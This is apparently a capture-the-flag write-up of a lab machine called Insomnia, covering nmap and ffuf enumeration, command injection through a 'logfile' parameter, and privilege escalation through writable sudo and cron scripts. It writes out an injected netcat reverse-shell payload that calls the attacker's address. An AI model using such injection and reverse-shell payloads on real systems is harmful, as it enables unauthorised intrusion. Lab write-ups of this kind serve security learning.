---
layout: default
title : muzec - Insomnia Writeup
---

![image](https://user-images.githubusercontent.com/69868171/120119641-d340db00-c166-11eb-9134-b7fc3ec78f40.png)

A cool box that really let me to master ffuf and also learn something new on it again let hit it.

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
# Nmap 7.91 scan initiated Sun May 30 11:13:41 2021 as: nmap -p- -sC -sV -oA nmap 172.16.139.193
Nmap scan report for 172.16.139.193
Host is up (0.00020s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    PHP cli server 5.5 or later (PHP 7.3.19-1)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Chat

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 30 11:13:50 2021 -- 1 IP address (1 host up) scanned in 9.53 seconds
```

We have only one open port which is 80 so we are hitting it.

![image](https://user-images.githubusercontent.com/69868171/120119745-75f95980-c167-11eb-8195-01e9c4383011.png)


A webchat intersting checking the source code we found the chat.js .

![image](https://user-images.githubusercontent.com/69868171/120119798-bce74f00-c167-11eb-9996-22f1b8d11cd3.png)

Nothing that can help use out so i decided to burst some directory with `ffuf` for some hidden directory.

![image](https://user-images.githubusercontent.com/69868171/120119881-1485ba80-c168-11eb-8214-1d2e21f7406b.png)

`ffuf` command that i use `ffuf -u http://172.16.139.193:8080/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e .txt,.php,.html -fw 1005` ok we have some directory especially the `administration.php` look interesting also check the other directory but got nothing .

![image](https://user-images.githubusercontent.com/69868171/120121967-1d7c8900-c174-11eb-8cfb-f98693aca874.png)

So i decided to Fuzz the endpoint maybe a way in i guess.

`ffuf -u http://172.16.139.193:8080/administration.php?FUZZ=test -w /usr/share/dirb/wordlists/big.txt -fw 12` and boom we got it `logfile` interesting right `http://172.16.139.193:8080/administration.php?logfile=` .

![image](https://user-images.githubusercontent.com/69868171/120122617-e7410880-c177-11eb-809f-14d04ed49f76.png)

Cool why not we try to input a reverse shell payload in the parameter since it always output what we put in the parameter no hard feeling in trying the first i try using was `nc -e /bin/sh 192.168.8.101 1337` but no luck so i try adding `;nc -e /bin/sh 192.168.8.101 1337` and boom we got shell.

![image](https://user-images.githubusercontent.com/69868171/120122770-e8266a00-c178-11eb-8b75-9e0d62547362.png)


![image](https://user-images.githubusercontent.com/69868171/120122779-f96f7680-c178-11eb-8d8d-15d1bb61cf8b.png)

Spawning a TTY shell `python -c 'import pty; pty.spawn ("/bin/bash")'`  now let move to the home directory and we have our first flag.

![image](https://user-images.githubusercontent.com/69868171/120122865-89adbb80-c179-11eb-808d-17d34d1c1167.png)

### Privilege Escalation

Checking `sudo -l` and seems we can run `/bin/bash /var/www/html/start.sh` on sudo with user `julia ` cool now let check the file yes we have write access to it so i add my payload and start an Ncat listener.

![image](https://user-images.githubusercontent.com/69868171/120123328-31c48400-c17c-11eb-8b5b-90bc48209ebd.png)

Running.

![image](https://user-images.githubusercontent.com/69868171/120123336-54ef3380-c17c-11eb-8453-8418f11566c8.png)

Now let go check our listener.

![image](https://user-images.githubusercontent.com/69868171/120123347-76501f80-c17c-11eb-9842-e598a9301195.png)

Boom now let check cronjob.

![image](https://user-images.githubusercontent.com/69868171/120123375-8f58d080-c17c-11eb-9761-59c75732aab9.png)

Let check if we have write access to it also.

![image](https://user-images.githubusercontent.com/69868171/120123397-aa2b4500-c17c-11eb-9000-0ebfe0d61e35.png)

Yes we do let repeat the same process we just did not long ago but we leave it to run on is own since it set on cronjob.

![image](https://user-images.githubusercontent.com/69868171/120123494-29b91400-c17d-11eb-87eb-41491e809381.png)

Boom we are root and we are done.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
